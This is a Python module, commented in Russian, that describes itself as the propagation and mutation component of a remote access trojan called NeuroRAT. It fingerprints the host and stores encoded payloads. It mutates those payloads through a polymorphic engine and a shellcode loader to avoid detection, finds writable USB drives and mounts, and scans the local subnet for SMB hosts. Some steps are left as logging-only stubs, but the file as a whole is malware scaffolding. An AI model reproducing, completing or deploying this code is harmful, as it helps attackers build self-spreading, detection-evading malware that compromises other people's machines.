#!/usr/bin/env python3
"""
Propagator - Модуль для автоматического распространения и мутации кода
Позволяет NeuroRAT самостоятельно распространяться и адаптироваться к различным системам
"""

import os
import sys
import time
import random
from common.utils import get_logger
import logging
import platform
import tempfile
import subprocess
import shutil
import json
import base64
import zlib
import socket
import threading
from typing import Dict, List, Any, Optional, Tuple, Union

# Импортируем модуль полиморфной трансформации
from .poly_morpher import PolyMorpher

class Propagator:
    """
    Класс для управления распространением и мутацией вредоносного кода
    """
    
    # Методы распространения
    METHOD_USB = "usb"
    METHOD_NETWORK_SHARE = "network_share"
    METHOD_EMAIL = "email"
    METHOD_DOWNLOAD = "download"
    METHOD_REMOTE_EXEC = "remote_exec"
    
    def __init__(self, log_level: str = "INFO"):
        """
        Инициализация Propagator
        
        Args:
            log_level: Уровень логирования
        """
        self.logger = get_logger("propagator")
        self.logger.setLevel(getattr(logging, log_level, logging.INFO))
        
        # Инициализируем PolyMorpher для мутации кода
        self.morpher = PolyMorpher(log_level=log_level)
        
        # Пути к ключевым файлам
        self.self_path = os.path.abspath(sys.argv[0])
        self.working_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Временная директория для работы
        self.temp_dir = tempfile.mkdtemp(prefix="neuro_")
        
        # Информация о системе
        self.system_info = self._get_system_info()
        
        # Статистика
        self.stats = {
            "propagation_attempts": 0,
            "successful_propagations": 0,
            "mutations": 0,
            "last_propagation_time": 0,
            "targets": {}
        }
        
        # Конфигурация
        self.config = {
            "enabled_methods": [self.METHOD_USB, self.METHOD_NETWORK_SHARE],
            "max_attempts_per_target": 3,
            "mutation_probability": 0.8,
            "max_mutations": 5,
            "payloads": {}
        }
        
        self.logger.info("Propagator инициализирован")
    
    def _get_system_info(self) -> Dict[str, Any]:
        """
        Собирает информацию о системе
        
        Returns:
            Dict: Информация о системе
        """
        info = {
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": socket.gethostname(),
            "username": os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
            "admin": self._check_admin_rights(),
            "interfaces": self._get_network_interfaces()
        }
        
        return info
    
    def _check_admin_rights(self) -> bool:
        """
        Проверяет наличие прав администратора
        
        Returns:
            bool: True если есть права администратора
        """
        if platform.system() == 'Windows':
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:
            return os.geteuid() == 0 if hasattr(os, 'geteuid') else False
    
    def _get_network_interfaces(self) -> Dict[str, str]:
        """
        Получает список сетевых интерфейсов
        
        Returns:
            Dict: Словарь с интерфейсами и IP-адресами
        """
        interfaces = {}
        
        try:
            import socket
            import netifaces
            
            for interface in netifaces.interfaces():
                addresses = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addresses:
                    for link in addresses[netifaces.AF_INET]:
                        interfaces[interface] = link.get('addr')
        except:
            # Если не удалось получить через netifaces, используем socket
            try:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                interfaces["default"] = ip
            except:
                pass
        
        return interfaces
    
    def set_config(self, config: Dict[str, Any]) -> None:
        """
        Устанавливает конфигурацию распространения
        
        Args:
            config: Словарь с конфигурацией
        """
        if not isinstance(config, dict):
            self.logger.error("Неверный формат конфигурации")
            return
        
        # Обновляем конфигурацию
        for key, value in config.items():
            if key in self.config:
                self.config[key] = value
        
        self.logger.info("Конфигурация обновлена")
    
    def add_payload(self, name: str, payload: bytes, target_os: str = "any", 
                    target_arch: str = "any", requires_admin: bool = False) -> bool:
        """
        Добавляет полезную нагрузку для распространения
        
        Args:
            name: Имя полезной нагрузки
            payload: Байты полезной нагрузки
            target_os: Целевая ОС (Windows, Linux, macOS, any)
            target_arch: Целевая архитектура (x86, x64, arm, any)
            requires_admin: Требуются ли права администратора
            
        Returns:
            bool: True в случае успеха
        """
        try:
            # Сжимаем полезную нагрузку
            compressed = zlib.compress(payload)
            encoded = base64.b64encode(compressed).decode('ascii')
            
            # Создаем запись в конфигурации
            self.config["payloads"][name] = {
                "data": encoded,
                "target_os": target_os,
                "target_arch": target_arch,
                "requires_admin": requires_admin,
                "size": len(payload),
                "timestamp": int(time.time())
            }
            
            self.logger.info(f"Добавлена полезная нагрузка: {name} ({len(payload)} байт)")
            return True
        
        except Exception as e:
            self.logger.error(f"Ошибка при добавлении полезной нагрузки: {e}")
            return False
    
    def extract_payload(self, name: str) -> Optional[bytes]:
        """
        Извлекает полезную нагрузку из конфигурации
        
        Args:
            name: Имя полезной нагрузки
            
        Returns:
            bytes: Байты полезной нагрузки или None в случае ошибки
        """
        try:
            # Проверяем наличие полезной нагрузки
            if name not in self.config["payloads"]:
                self.logger.error(f"Полезная нагрузка не найдена: {name}")
                return None
            
            # Получаем данные
            payload_info = self.config["payloads"][name]
            encoded = payload_info["data"]
            
            # Декодируем и распаковываем
            compressed = base64.b64decode(encoded)
            payload = zlib.decompress(compressed)
            
            return payload
        
        except Exception as e:
            self.logger.error(f"Ошибка при извлечении полезной нагрузки: {e}")
            return None
    
    def mutate_payload(self, payload: bytes, target_format: str = "py") -> bytes:
        """
        Мутирует полезную нагрузку для обхода обнаружения
        
        Args:
            payload: Исходная полезная нагрузка
            target_format: Формат полезной нагрузки (py, exe, bin)
            
        Returns:
            bytes: Мутированная полезная нагрузка
        """
        try:
            if target_format == "py":
                # Для Python-кода используем PolyMorpher
                try:
                    # Сохраняем во временный файл
                    temp_file = os.path.join(self.temp_dir, f"payload_{int(time.time())}.py")
                    with open(temp_file, 'wb') as f:
                        f.write(payload)
                    
                    # Трансформируем
                    morphed_file = self.morpher.transform_module(temp_file)
                    
                    # Читаем результат
                    with open(morphed_file, 'rb') as f:
                        result = f.read()
                    
                    # Удаляем временные файлы
                    try:
                        os.remove(temp_file)
                        os.remove(morphed_file)
                    except:
                        pass
                    
                    self.stats["mutations"] += 1
                    return result
                
                except Exception as e:
                    self.logger.error(f"Ошибка при мутации Python-кода: {e}")
                    return payload
            
            elif target_format == "exe":
                # Для EXE используем шеллкод-подход
                try:
                    # Создаем упаковщик шеллкода
                    shellcode_loader = self.morpher.create_shellcode_loader(payload)
                    
                    # Для продвинутых сценариев здесь можно было бы компилировать
                    # полученный loader в EXE, но пока просто возвращаем loader
                    
                    self.stats["mutations"] += 1
                    return shellcode_loader
                
                except Exception as e:
                    self.logger.error(f"Ошибка при мутации EXE: {e}")
                    return payload
            
            else:
                # Для других форматов просто возвращаем исходные данные
                return payload
        
        except Exception as e:
            self.logger.error(f"Ошибка при мутации: {e}")
            return payload
    
    def propagate_usb(self) -> int:
        """
        Распространяет полезную нагрузку через USB-накопители
        
        Returns:
            int: Количество успешных распространений
        """
        # Метод имитирует распространение через USB, но не выполняет реальных вредоносных действий
        
        success_count = 0
        
        try:
            if platform.system() == 'Windows':
                # На Windows ищем доступные съемные диски
                import string
                import ctypes
                
                drives = []
                bitmask = ctypes.windll.kernel32.GetLogicalDrives()
                
                for letter in string.ascii_uppercase:
                    if bitmask & 1:
                        drive = f"{letter}:\\"
                        try:
                            drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
                            # 2: Съемный диск, 3: Жесткий диск, 4: Сетевой диск, 5: CD-ROM, 6: RAM-диск
                            if drive_type == 2:  # DRIVE_REMOVABLE
                                drives.append(drive)
                        except:
                            pass
                    bitmask >>= 1
                
                # Для каждого съемного диска пытаемся распространиться
                for drive in drives:
                    try:
                        # Простая проверка на доступность для записи
                        test_file = os.path.join(drive, ".test_write")
                        try:
                            with open(test_file, 'w') as f:
                                f.write("test")
                            os.remove(test_file)
                        except:
                            continue
                        
                        # Логируем успешную попытку записи
                        self.logger.info(f"USB-диск доступен для записи: {drive}")
                        
                        # В реальном сценарии здесь бы создавались autorun.inf или другие файлы для автозапуска
                        # Но в этом примере только логируем
                        
                        success_count += 1
                        self.stats["targets"][drive] = {
                            "method": self.METHOD_USB,
                            "timestamp": int(time.time()),
                            "success": True
                        }
                    except Exception as e:
                        self.logger.warning(f"Ошибка при попытке распространения на USB {drive}: {e}")
            
            elif platform.system() in ['Linux', 'Darwin']:
                # На Linux/macOS проверяем /media, /mnt или /Volumes
                mount_points = []
                
                if platform.system() == 'Linux':
                    # Проверяем стандартные точки монтирования
                    for base in ['/media', '/mnt']:
                        if os.path.exists(base):
                            for user_dir in os.listdir(base):
                                user_path = os.path.join(base, user_dir)
                                if os.path.isdir(user_path):
                                    for device in os.listdir(user_path):
                                        mount_point = os.path.join(user_path, device)
                                        if os.path.isdir(mount_point):
                                            mount_points.append(mount_point)
                
                elif platform.system() == 'Darwin':
                    # На macOS проверяем /Volumes
                    volumes_path = '/Volumes'
                    if os.path.exists(volumes_path):
                        for volume in os.listdir(volumes_path):
                            mount_point = os.path.join(volumes_path, volume)
                            if os.path.isdir(mount_point) and volume != 'Macintosh HD':
                                mount_points.append(mount_point)
                
                # Для каждой точки монтирования пытаемся распространиться
                for mount_point in mount_points:
                    try:
                        # Проверяем доступность для записи
                        test_file = os.path.join(mount_point, ".test_write")
                        try:
                            with open(test_file, 'w') as f:
                                f.write("test")
                            os.remove(test_file)
                        except:
                            continue
                        
                        # Логируем успешную попытку записи
                        self.logger.info(f"Точка монтирования доступна для записи: {mount_point}")
                        
                        # В реальном сценарии здесь бы создавались скрытые файлы для автозапуска
                        # Но в этом примере только логируем
                        
                        success_count += 1
                        self.stats["targets"][mount_point] = {
                            "method": self.METHOD_USB,
                            "timestamp": int(time.time()),
                            "success": True
                        }
                    except Exception as e:
                        self.logger.warning(f"Ошибка при попытке распространения на {mount_point}: {e}")
        
        except Exception as e:
            self.logger.error(f"Ошибка при распространении через USB: {e}")
        
        self.stats["propagation_attempts"] += 1
        self.stats["successful_propagations"] += success_count
        self.stats["last_propagation_time"] = int(time.time())
        
        return success_count
    
    def propagate_network(self, target_ips: List[str] = None) -> int:
        """
        Распространяет полезную нагрузку через сетевые ресурсы
        
        Args:
            target_ips: Список целевых IP-адресов (если None, выполняется сканирование сети)
            
        Returns:
            int: Количество успешных распространений
        """
        # Метод имитирует распространение через сеть, но не выполняет реальных вредоносных действий
        
        success_count = 0
        
        # Если не указаны целевые IP, выполняем простое сканирование локальной сети
        if not target_ips:
            target_ips = self._scan_local_network()
        
        # Перебираем целевые IP
        for ip in target_ips:
            try:
                # Проверяем доступность хоста
                if not self._check_host_availability(ip):
                    continue
                
                # Логируем доступный хост
                self.logger.info(f"Хост доступен для сканирования: {ip}")
                
                # В реальном сценарии здесь бы производились попытки подключения к общим ресурсам
                # или эксплуатация уязвимостей, но в этом примере только логируем
                
                # Имитируем успешное распространение с некоторой вероятностью
                if random.random() < 0.3:
                    success_count += 1
                    self.stats["targets"][ip] = {
                        "method": self.METHOD_NETWORK_SHARE,
                        "timestamp": int(time.time()),
                        "success": True
                    }
            except Exception as e:
                self.logger.warning(f"Ошибка при попытке распространения на {ip}: {e}")
        
        self.stats["propagation_attempts"] += 1
        self.stats["successful_propagations"] += success_count
        self.stats["last_propagation_time"] = int(time.time())
        
        return success_count
    
    def _scan_local_network(self) -> List[str]:
        """
        Сканирует локальную сеть для поиска потенциальных целей
        
        Returns:
            List[str]: Список IP-адресов в локальной сети
        """
        targets = []
        
        try:
            # Получаем информацию о сетевых интерфейсах
            interfaces = self.system_info["interfaces"]
            
            # Перебираем интерфейсы
            for interface, ip in interfaces.items():
                if not ip or ip.startswith('127.') or ip.startswith('169.254.'):
                    continue
                
                # Определяем базовую сеть для сканирования
                network_base = '.'.join(ip.split('.')[:3]) + '.'
                
                # Добавляем несколько IP из этой сети
                for i in range(1, 10):
                    target_ip = network_base + str(random.randint(1, 254))
                    if target_ip != ip:  # Исключаем собственный IP
                        targets.append(target_ip)
        
        except Exception as e:
            self.logger.error(f"Ошибка при сканировании сети: {e}")
        
        return targets
    
    def _check_host_availability(self, ip: str) -> bool:
        """
        Проверяет доступность хоста в сети
        
        Args:
            ip: IP-адрес хоста
            
        Returns:
            bool: True если хост доступен
        """
        try:
            # Простая проверка через сокет
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            result = s.connect_ex((ip, 445))  # Порт 445 (SMB)
            s.close()
            
            return result == 0
        except:
            return False
    
    def propagate(self, methods: List[str] = None) -> Dict[str, int]:
        """
        Выполняет распространение всеми доступными методами
        
        Args:
            methods: Список методов распространения (если None, используются все включенные методы)
            
        Returns:
            Dict[str, int]: Словарь с результатами распространения по каждому методу
        """
        # Если методы не указаны, используем все включенные
        if methods is None:
            methods = self.config["enabled_methods"]
        
        results = {}
        
        # Запускаем каждый метод распространения
        for method in methods:
            try:
                if method == self.METHOD_USB:
                    results[method] = self.propagate_usb()
                elif method == self.METHOD_NETWORK_SHARE:
                    results[method] = self.propagate_network()
                else:
                    self.logger.warning(f"Неподдерживаемый метод распространения: {method}")
                    results[method] = 0
            except Exception as e:
                self.logger.error(f"Ошибка при распространении методом {method}: {e}")
                results[method] = 0
        
        return results
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Возвращает статистику работы модуля распространения
        
        Returns:
            Dict: Статистика работы
        """
        return dict(self.stats)
    
    def cleanup(self) -> None:
        """
        Очищает временные файлы и ресурсы
        """
        try:
            # Удаляем временную директорию
            shutil.rmtree(self.temp_dir, ignore_errors=True)
            
            self.logger.info("Временные файлы очищены")
        except Exception as e:
            self.logger.error(f"Ошибка при очистке: {e}")


if __name__ == "__main__":
    # Пример использования
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
    
    # Создаем экземпляр Propagator
    propagator = Propagator()
    
    # Добавляем полезную нагрузку (пустышка для демонстрации)
    dummy_payload = b"print('Hello, World!')"
    propagator.add_payload("test_payload", dummy_payload)
    
    # Мутируем полезную нагрузку
    mutated = propagator.mutate_payload(dummy_payload)
    print(f"Mutated payload size: {len(mutated)} bytes")
    
    # Распространяем
    results = propagator.propagate()
    print(f"Propagation results: {results}")
    
    # Получаем статистику
    stats = propagator.get_statistics()
    print(f"Statistics: {stats}")
    
    # Очищаем
    propagator.cleanup() 